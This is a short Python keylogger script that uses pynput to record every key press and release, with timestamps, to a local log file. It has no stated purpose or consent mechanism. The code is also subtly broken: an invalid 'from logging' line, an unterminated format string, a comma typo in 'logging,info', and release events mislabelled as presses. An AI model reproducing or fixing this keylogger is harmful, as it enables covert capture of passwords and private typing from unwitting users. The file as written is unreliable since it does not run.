from pynput.keyboard import Listener
from logging

logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message')

def on_press(key):
    logging.info("key pressed: {0}".format(key))
    

def on_release(key):
    logging,info("key pressed: {0}".format(key))

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
